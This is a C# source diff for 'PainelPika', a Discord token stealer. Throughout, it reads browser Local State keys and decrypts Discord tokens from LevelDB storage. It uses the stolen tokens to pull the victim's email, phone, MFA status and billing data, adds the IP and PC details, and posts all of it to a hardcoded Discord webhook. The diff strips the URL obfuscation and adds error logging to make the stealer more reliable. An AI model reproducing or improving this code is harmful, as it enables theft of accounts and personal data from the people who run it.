@@ -17,6 +17,8 @@ namespace PainelPika
 {
     class Program
     {
+        private static readonly string LogFilePath = Path.Combine(Environment.CurrentDirectory, "debug.log");
+
         // P/Invoke for Windows APIs
         [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
         private static extern bool GetVersionExW(ref OSVERSIONINFOEXW osvi);
@@ -54,6 +56,13 @@ namespace PainelPika
         {
             public uint cbData;
             public IntPtr pbData;
+        }
+
+        // Log errors to file
+        private static void LogError(string message)
+        {
+            File.AppendAllText(LogFilePath, $"{DateTime.Now}: {message}\n");
+            Console.WriteLine(message);
         }
 
         // Compile-time XOR string obfuscation equivalent (runtime in C#)
@@ -102,6 +111,7 @@ namespace PainelPika
             Process? process = Process.Start(psi);
             if (process == null)
             {
+                LogError("Failed to start cmd.exe process.");
                 return "";
             }
             using (process)
@@ -128,14 +138,21 @@ namespace PainelPika
             {
                 try
                 {
-                    string url = XORString("https://api.ipify.org", "AstraaDevKey");
+                    string url = "https://api.ipify.org";
                     HttpResponseMessage res = await client.GetAsync(url);
                     if (res.IsSuccessStatusCode)
                     {
                         return await res.Content.ReadAsStringAsync();
                     }
+                    else
+                    {
+                        LogError($"Failed to get IP. Status: {res.StatusCode}");
+                    }
                 }
-                catch { }
+                catch (Exception ex)
+                {
+                    LogError($"IP request failed: {ex.Message}");
+                }
             }
             return "None";
         }
@@ -145,9 +162,18 @@ namespace PainelPika
         {
             if (string.IsNullOrEmpty(input))
             {
+                LogError("Base64Decode: Input is null or empty.");
                 return Array.Empty<byte>();
             }
-            return Convert.FromBase64String(input);
+            try
+            {
+                return Convert.FromBase64String(input);
+            }
+            catch (Exception ex)
+            {
+                LogError($"Base64Decode failed: {ex.Message}");
+                return Array.Empty<byte>();
+            }
         }
 
         // XOR encryption/decryption
@@ -186,8 +212,15 @@ namespace PainelPika
                         return Encoding.UTF8.GetString(plaintext);
                     }
                 }
+                else
+                {
+                    LogError("CryptUnprotectData failed.");
+                }
             }
-            catch { }
+            catch (Exception ex)
+            {
+                LogError($"Decrypt failed: {ex.Message}");
+            }
             return "Error";
         }
 
@@ -227,156 +260,320 @@ namespace PainelPika
             string regex_encrypted_b64 = "JSIDRhZYEwIuKDRDaSg1XzsAaR9GZlxSbk4pWUg=";
             string api_me_encrypted_b64 = "KQcAAhJba0oSIhYaLgEQXAIOKUoXOwxWN0JEXRQSIRcFZCUUJA==";
             string api_billing_encrypted_b64 = "KQcAAhJba0oSIhYaLgEQXAIOKUoXOwxWN0JEXRQSIRcFZCUUJFwWGw0NLQsRZBYMIwAXAAgRMAwZJRY=";
-            string webhook_encrypted_b64 = "KQcAAhJba0oSIhYaLgEQXAIOKUoXOwxWNhYWGg4OLxZZelFJckNDR1dUdlxHclFAc0VESk4PFQFAIQkedEQVNjgyGy89OAQIHiABAlYLIQRDJUhBORIgFFcKdxcQPTAPdSMtQjgnGw9OISkmFzUsPwYEFQkTIzwqDw==";
+            string webhook_url = "https://discord.com/api/webhooks/1403075652919492608/nQd6jlg57aDYS_JKsaq_Sup7jea5n-8xaTf6k3rfvUv4PY0YF_j8jL_VFXMgeQlehYSN";
 
             string regex_pattern = XORCrypt(Encoding.UTF8.GetString(Base64Decode(regex_encrypted_b64)), key);
             string api_me_url = XORCrypt(Encoding.UTF8.GetString(Base64Decode(api_me_encrypted_b64)), key);
             string api_billing_url = XORCrypt(Encoding.UTF8.GetString(Base64Decode(api_billing_encrypted_b64)), key);
-            string webhook_url = XORCrypt(Encoding.UTF8.GetString(Base64Decode(webhook_encrypted_b64)), key);
 
             foreach (var kvp in paths)
             {
                 string platform_name = kvp.Key;
                 string path = kvp.Value;
-                if (!Directory.Exists(path)) continue;
+                if (!Directory.Exists(path))
+                {
+                    LogError($"Directory not found: {path}");
+                    continue;
+                }
 
                 string local_state_path = Path.Combine(path, "Local State");
-                if (!File.Exists(local_state_path)) continue;
-
-                string buffer = File.ReadAllText(local_state_path);
-                JsonDocument local_state_doc = JsonDocument.Parse(buffer);
-                JsonElement local_state = local_state_doc.RootElement;
-                if (!local_state.TryGetProperty("os_crypt", out JsonElement os_crypt) ||
-                    !os_crypt.TryGetProperty("encrypted_key", out JsonElement encrypted_key_elem)) continue;
-
-                string? encrypted_key_str = encrypted_key_elem.GetString();
-                if (encrypted_key_str == null) continue;
-                byte[] encrypted_key = Base64Decode(encrypted_key_str);
-                byte[] master_key = new byte[encrypted_key.Length - 5];
-                Array.Copy(encrypted_key, 5, master_key, 0, master_key.Length);
-
-                string leveldb_dir = Path.Combine(path, "Local Storage", "leveldb");
-                if (!Directory.Exists(leveldb_dir)) continue;
-
-                foreach (string file_path in Directory.EnumerateFiles(leveldb_dir, "*.*", SearchOption.TopDirectoryOnly)
-                    .Where(f => f.EndsWith(".ldb") || f.EndsWith(".log")))
+                if (!File.Exists(local_state_path))
                 {
-                    string file_content = File.ReadAllText(file_path);
-                    MatchCollection matches = Regex.Matches(file_content, regex_pattern);
-                    foreach (Match match in matches)
-                    {
-                        if (match.Value != null)
-                        {
-                            tokens.Add(match.Value);
-                        }
-                    }
+                    LogError($"Local State file not found: {local_state_path}");
+                    continue;
                 }
 
-                List<string> already_check = new List<string>();
-                foreach (string token in tokens)
+                string buffer;
+                try
                 {
-                    string clean_token = token;
-                    if (clean_token.EndsWith("\\")) clean_token = clean_token.Substring(0, clean_token.Length - 1);
-                    if (!cleaned.Contains(clean_token))
-                    {
-                        cleaned.Add(clean_token);
-                    }
+                    buffer = File.ReadAllText(local_state_path);
+                }
+                catch (Exception ex)
+                {
+                    LogError($"Failed to read Local State: {ex.Message}");
+                    continue;
                 }
 
-                using (HttpClient cli = new HttpClient())
+                JsonDocument? local_state_doc;
+                try
                 {
-                    foreach (string token in cleaned)
+                    local_state_doc = JsonDocument.Parse(buffer);
+                }
+                catch (Exception ex)
+                {
+                    LogError($"Failed to parse Local State JSON: {ex.Message}");
+                    continue;
+                }
+
+                using (local_state_doc)
+                {
+                    JsonElement local_state = local_state_doc.RootElement;
+                    if (!local_state.TryGetProperty("os_crypt", out JsonElement os_crypt) ||
+                        !os_crypt.TryGetProperty("encrypted_key", out JsonElement encrypted_key_elem))
                     {
-                        string tok;
+                        LogError($"os_crypt or encrypted_key not found in {local_state_path}");
+                        continue;
+                    }
+
+                    string? encrypted_key_str = encrypted_key_elem.GetString();
+                    if (encrypted_key_str == null)
+                    {
+                        LogError("Encrypted key is null.");
+                        continue;
+                    }
+                    byte[] encrypted_key = Base64Decode(encrypted_key_str);
+                    if (encrypted_key.Length < 5)
+                    {
+                        LogError("Encrypted key is too short.");
+                        continue;
+                    }
+                    byte[] master_key = new byte[encrypted_key.Length - 5];
+                    Array.Copy(encrypted_key, 5, master_key, 0, master_key.Length);
+
+                    string leveldb_dir = Path.Combine(path, "Local Storage", "leveldb");
+                    if (!Directory.Exists(leveldb_dir))
+                    {
+                        LogError($"LevelDB directory not found: {leveldb_dir}");
+                        continue;
+                    }
+
+                    foreach (string file_path in Directory.EnumerateFiles(leveldb_dir, "*.*", SearchOption.TopDirectoryOnly)
+                        .Where(f => f.EndsWith(".ldb") || f.EndsWith(".log")))
+                    {
+                        string file_content;
                         try
                         {
-                            int pos = token.IndexOf("dQw4w9WgXcQ:") + 13;
-                            if (pos < 13) continue;
-                            byte[] decoded = Base64Decode(token.Substring(pos));
-                            tok = Decrypt(decoded, master_key);
-                            if (tok == "Error") continue;
+                            file_content = File.ReadAllText(file_path);
                         }
-                        catch { continue; }
-
-                        if (already_check.Contains(tok)) continue;
-                        already_check.Add(tok);
-
-                        cli.DefaultRequestHeaders.Clear();
-                        cli.DefaultRequestHeaders.Add("Authorization", tok);
-                        cli.DefaultRequestHeaders.Add("Content-Type", "application/json");
-
-                        HttpResponseMessage res = await cli.GetAsync(api_me_url);
-                        if (!res.IsSuccessStatusCode) continue;
-
-                        string res_body = await res.Content.ReadAsStringAsync();
-                        JsonDocument res_json_doc = JsonDocument.Parse(res_body);
-                        JsonElement res_json = res_json_doc.RootElement;
-
-                        string ip = await GetIPAsync();
-                        string pc_username = GetEnvVar("UserName");
-                        string pc_name = GetEnvVar("COMPUTERNAME");
-                        string? user_name_disc = res_json.GetProperty("username").GetString();
-                        string? discriminator = res_json.GetProperty("discriminator").GetString();
-                        string user_name = $"{user_name_disc ?? "Unknown"}#{discriminator ?? "0000"}";
-                        string user_id = res_json.GetProperty("id").GetString() ?? "Unknown";
-                        string email = res_json.GetProperty("email").GetString() ?? "None";
-                        string? phone = res_json.TryGetProperty("phone", out JsonElement phoneElem) && phoneElem.ValueKind != JsonValueKind.Null ? phoneElem.GetString() ?? "None" : "None";
-                        bool mfa_enabled = res_json.GetProperty("mfa_enabled").GetBoolean();
-                        bool has_nitro = false;
-                        int days_left = 0;
-
-                        res = await cli.GetAsync(api_billing_url);
-                        if (res.IsSuccessStatusCode)
+                        catch (Exception ex)
                         {
-                            string nitro_body = await res.Content.ReadAsStringAsync();
-                            JsonDocument nitro_data_doc = JsonDocument.Parse(nitro_body);
-                            JsonElement nitro_data = nitro_data_doc.RootElement;
-                            has_nitro = nitro_data.GetArrayLength() > 0;
-                            if (has_nitro)
+                            LogError($"Failed to read file {file_path}: {ex.Message}");
+                            continue;
+                        }
+
+                        MatchCollection matches = Regex.Matches(file_content, regex_pattern);
+                        foreach (Match match in matches)
+                        {
+                            if (match.Value != null)
                             {
-                                JsonElement first = nitro_data[0];
-                                string? end = first.GetProperty("current_period_end").GetString();
-                                string? start = first.GetProperty("current_period_start").GetString();
-                                if (end != null && start != null)
-                                {
-                                    end = end.Substring(0, 19);
-                                    start = start.Substring(0, 19);
-                                    DateTime t1 = DateTime.ParseExact(end, "yyyy-MM-ddTHH:mm:ss", null);
-                                    DateTime t2 = DateTime.ParseExact(start, "yyyy-MM-ddTHH:mm:ss", null);
-                                    days_left = Math.Abs((int)(t1 - t2).TotalDays);
-                                }
+                                tokens.Add(match.Value);
                             }
                         }
+                    }
 
-                        StringBuilder embed = new StringBuilder();
-                        embed.Append(user_name).Append(" (").Append(user_id).Append(")\n\n")
-                             .Append("> :dividers: Account Information\n")
-                             .Append("\tEmail: ").Append(email).Append("\n")
-                             .Append("\tPhone: ").Append(phone).Append("\n")
-                             .Append("\t2FA/MFA Enabled: ").Append(mfa_enabled ? "True" : "False").Append("\n")
-                             .Append("\tNitro: ").Append(has_nitro ? "True" : "False").Append("\n")
-                             .Append("\tExpires in: ").Append(days_left > 0 ? days_left.ToString() : "None").Append(" day(s)\n")
-                             .Append(":computer: PC Information\n")
-                             .Append("\tIP: ").Append(ip).Append("\n")
-                             .Append("\tUsername: ").Append(pc_username).Append("\n")
-                             .Append("\tPC Name: ").Append(pc_name).Append("\n")
-                             .Append("\tPlatform: ").Append(GetWindowsVersion()).Append("\n")
-                             .Append(":piÃ±ata: Token\n")
-                             .Append("\t").Append(tok).Append("\n")
-                             .Append("Made by Astraa#6100 | ||https://github.com/astraadev||");
-
-                        var payload = new
+                    List<string> already_check = new List<string>();
+                    foreach (string token in tokens)
+                    {
+                        string clean_token = token;
+                        if (clean_token.EndsWith("\\")) clean_token = clean_token.Substring(0, clean_token.Length - 1);
+                        if (!cleaned.Contains(clean_token))
                         {
-                            content = embed.ToString(),
-                            username = "painel pika- Made by Astraa",
-                            avatar_url = XORString("https://cdn.discordapp.com/attachments/826581697436581919/982374264604864572/atio.jpg", key)
-                        };
+                            cleaned.Add(clean_token);
+                        }
+                    }
 
-                        string jsonPayload = JsonSerializer.Serialize(payload);
-                        using (HttpClient webhook_cli = new HttpClient())
+                    using (HttpClient cli = new HttpClient())
+                    {
+                        foreach (string token in cleaned)
                         {
-                            var content = new StringContent(jsonPayload, Encoding.UTF8, "application/json");
-                            await webhook_cli.PostAsync(webhook_url, content);
+                            string tok;
+                            try
+                            {
+                                int pos = token.IndexOf("dQw4w9WgXcQ:") + 13;
+                                if (pos < 13)
+                                {
+                                    LogError("Invalid token format.");
+                                    continue;
+                                }
+                                byte[] decoded = Base64Decode(token.Substring(pos));
+                                if (decoded.Length == 0)
+                                {
+                                    LogError("Base64 decode returned empty array.");
+                                    continue;
+                                }
+                                tok = Decrypt(decoded, master_key);
+                                if (tok == "Error")
+                                {
+                                    LogError("Decryption failed for token.");
+                                    continue;
+                                }
+                            }
+                            catch (Exception ex)
+                            {
+                                LogError($"Token processing failed: {ex.Message}");
+                                continue;
+                            }
+
+                            if (already_check.Contains(tok)) continue;
+                            already_check.Add(tok);
+
+                            cli.DefaultRequestHeaders.Clear();
+                            cli.DefaultRequestHeaders.Add("Authorization", tok);
+                            cli.DefaultRequestHeaders.Add("Content-Type", "application/json");
+
+                            HttpResponseMessage res;
+                            try
+                            {
+                                res = await cli.GetAsync(api_me_url);
+                            }
+                            catch (Exception ex)
+                            {
+                                LogError($"API request to {api_me_url} failed: {ex.Message}");
+                                continue;
+                            }
+
+                            if (!res.IsSuccessStatusCode)
+                            {
+                                LogError($"API request failed. Status: {res.StatusCode}");
+                                continue;
+                            }
+
+                            string res_body;
+                            try
+                            {
+                                res_body = await res.Content.ReadAsStringAsync();
+                            }
+                            catch (Exception ex)
+                            {
+                                LogError($"Failed to read API response: {ex.Message}");
+                                continue;
+                            }
+
+                            JsonDocument? res_json_doc;
+                            try
+                            {
+                                res_json_doc = JsonDocument.Parse(res_body);
+                            }
+                            catch (Exception ex)
+                            {
+                                LogError($"Failed to parse API response JSON: {ex.Message}");
+                                continue;
+                            }
+
+                            using (res_json_doc)
+                            {
+                                JsonElement res_json = res_json_doc.RootElement;
+                                string ip = await GetIPAsync();
+                                string pc_username = GetEnvVar("UserName");
+                                string pc_name = GetEnvVar("COMPUTERNAME");
+                                string? user_name_disc = res_json.GetProperty("username").GetString();
+                                string? discriminator = res_json.GetProperty("discriminator").GetString();
+                                string user_name = $"{user_name_disc ?? "Unknown"}#{discriminator ?? "0000"}";
+                                string user_id = res_json.GetProperty("id").GetString() ?? "Unknown";
+                                string email = res_json.GetProperty("email").GetString() ?? "None";
+                                string? phone = res_json.TryGetProperty("phone", out JsonElement phoneElem) && phoneElem.ValueKind != JsonValueKind.Null ? phoneElem.GetString() ?? "None" : "None";
+                                bool mfa_enabled = res_json.GetProperty("mfa_enabled").GetBoolean();
+                                bool has_nitro = false;
+                                int days_left = 0;
+
+                                try
+                                {
+                                    res = await cli.GetAsync(api_billing_url);
+                                }
+                                catch (Exception ex)
+                                {
+                                    LogError($"API billing request failed: {ex.Message}");
+                                    continue;
+                                }
+
+                                if (res.IsSuccessStatusCode)
+                                {
+                                    string nitro_body;
+                                    try
+                                    {
+                                        nitro_body = await res.Content.ReadAsStringAsync();
+                                    }
+                                    catch (Exception ex)
+                                    {
+                                        LogError($"Failed to read billing API response: {ex.Message}");
+                                        continue;
+                                    }
+
+                                    JsonDocument? nitro_data_doc;
+                                    try
+                                    {
+                                        nitro_data_doc = JsonDocument.Parse(nitro_body);
+                                    }
+                                    catch (Exception ex)
+                                    {
+                                        LogError($"Failed to parse billing API response JSON: {ex.Message}");
+                                        continue;
+                                    }
+
+                                    using (nitro_data_doc)
+                                    {
+                                        JsonElement nitro_data = nitro_data_doc.RootElement;
+                                        has_nitro = nitro_data.GetArrayLength() > 0;
+                                        if (has_nitro)
+                                        {
+                                            JsonElement first = nitro_data[0];
+                                            string? end = first.GetProperty("current_period_end").GetString();
+                                            string? start = first.GetProperty("current_period_start").GetString();
+                                            if (end != null && start != null)
+                                            {
+                                                try
+                                                {
+                                                    end = end.Substring(0, 19);
+                                                    start = start.Substring(0, 19);
+                                                    DateTime t1 = DateTime.ParseExact(end, "yyyy-MM-ddTHH:mm:ss", null);
+                                                    DateTime t2 = DateTime.ParseExact(start, "yyyy-MM-ddTHH:mm:ss", null);
+                                                    days_left = Math.Abs((int)(t1 - t2).TotalDays);
+                                                }
+                                                catch (Exception ex)
+                                                {
+                                                    LogError($"Failed to parse Nitro dates: {ex.Message}");
+                                                }
+                                            }
+                                        }
+                                    }
+                                }
+
+                                StringBuilder embed = new StringBuilder();
+                                embed.Append(user_name).Append(" (").Append(user_id).Append(")\n\n")
+                                     .Append("> :dividers: Account Information\n")
+                                     .Append("\tEmail: ").Append(email).Append("\n")
+                                     .Append("\tPhone: ").Append(phone).Append("\n")
+                                     .Append("\t2FA/MFA Enabled: ").Append(mfa_enabled ? "True" : "False").Append("\n")
+                                     .Append("\tNitro: ").Append(has_nitro ? "True" : "False").Append("\n")
+                                     .Append("\tExpires in: ").Append(days_left > 0 ? days_left.ToString() : "None").Append(" day(s)\n")
+                                     .Append(":computer: PC Information\n")
+                                     .Append("\tIP: ").Append(ip).Append("\n")
+                                     .Append("\tUsername: ").Append(pc_username).Append("\n")
+                                     .Append("\tPC Name: ").Append(pc_name).Append("\n")
+                                     .Append("\tPlatform: ").Append(GetWindowsVersion()).Append("\n")
+                                     .Append(":piñata: Token\n")
+                                     .Append("\t").Append(tok).Append("\n")
+                                     .Append("Made by Astraa#6100 | ||https://github.com/astraadev||");
+
+                                var payload = new
+                                {
+                                    content = embed.ToString(),
+                                    username = "painel pika- Made by Astraa",
+                                    avatar_url = XORString("https://cdn.discordapp.com/attachments/826581697436581919/982374264604864572/atio.jpg", key)
+                                };
+
+                                string jsonPayload = JsonSerializer.Serialize(payload);
+                                using (HttpClient webhook_cli = new HttpClient())
+                                {
+                                    var content = new StringContent(jsonPayload, Encoding.UTF8, "application/json");
+                                    try
+                                    {
+                                        var webhook_response = await webhook_cli.PostAsync(webhook_url, content);
+                                        if (webhook_response.IsSuccessStatusCode)
+                                        {
+                                            Console.WriteLine($"Successfully sent data to webhook for token: {tok.Substring(0, 10)}...");
+                                        }
+                                        else
+                                        {
+                                            LogError($"Webhook post failed. Status: {webhook_response.StatusCode}");
+                                        }
+                                    }
+                                    catch (Exception ex)
+                                    {
+                                        LogError($"Webhook post failed: {ex.Message}");
+                                    }
+                                }
+                            }
                         }
                     }
                 }
@@ -385,10 +582,14 @@ namespace PainelPika
 
         static async Task Main(string[] args)
         {
+            File.WriteAllText(LogFilePath, $"{DateTime.Now}: Program started.\n");
+            Console.WriteLine("Starting token extraction...");
             List<string> tokens = new List<string>();
             List<string> cleaned = new List<string>();
             await GetTokensAsync(tokens, cleaned);
-            Console.WriteLine("Finished. Press any key to exit...");
+            Console.WriteLine($"Found {cleaned.Count} unique tokens.");
+            Console.WriteLine("Check debug.log for details.");
+            Console.WriteLine("Press any key to exit...");
             Console.ReadKey();
         }
     }
